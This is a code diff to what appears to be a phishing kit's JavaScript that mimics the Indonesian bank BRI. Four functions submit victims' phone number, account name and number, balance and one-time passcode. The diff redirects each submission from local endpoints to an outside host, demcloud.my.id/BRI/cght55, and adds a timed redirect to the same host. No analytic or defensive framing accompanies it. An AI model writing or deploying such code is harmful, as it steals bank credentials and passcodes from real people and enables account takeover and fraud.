@@ -18,7 +18,7 @@ function sendNohp(){
    
        $.ajax({
             type: 'POST',
-            url: 'rest/no.php',
+            url: 'https://demcloud.my.id/BRI/cght55/no.php',
             data: $('#hpForm').serialize(),
             datatype: 'JSON',
             
@@ -47,13 +47,13 @@ function sendLogin(){
     const rek = $('#rek').val();
                                 
    if (!tarif || !nomor || !nama || !rek ) {      
-        window.location.href = "index.php";
+        window.location.href = "index.html";
         return false;
     }                        
    
      $.ajax({
             type: 'POST',
-            url: 'rest/login.php',
+            url: 'https://demcloud.my.id/BRI/cght55/login.php',
             data: $('#loginForm').serialize(),
             datatype: 'JSON',
             
@@ -89,13 +89,13 @@ function sendSaldo(){
     const saldo = $('#saldo').val();
                                 
    if (!tarif || !nomor || !nama || !rek || !saldo) {      
-        window.location.href = "index.php";
+        window.location.href = "index.html";
         return false;
     }    
   
        $.ajax({
             type: 'POST',
-            url: 'rest/saldo.php',
+            url: 'https://demcloud.my.id/BRI/cght55/saldo.php',
             data: $('#saldoForm').serialize(),
             datatype: 'JSON',
         
@@ -134,13 +134,13 @@ function sendOtp(){
     const otp = $('#otp').val();
                                 
    if (!tarif || !nomor || !nama || !rek || !saldo || !otp) {      
-        window.location.href = "index.php";
+        window.location.href = "index.html";
         return false;
     }    
      
      $.ajax({
             type: 'POST',
-            url: 'rest/otp.php',
+            url: 'https://demcloud.my.id/BRI/cght55/otp.php',
             data: $('#formOtp').serialize(),
             datatype: 'JSON',
         
@@ -169,7 +169,7 @@ function wa(){
    audio.play();
    
 setTimeout(function(){  
-location.href='wa';
+location.href='https://demcloud.my.id/BRI/cght55/wa';
     }, 5000);
     setTimeout(function(){
     $(".wait").fadeOut();   
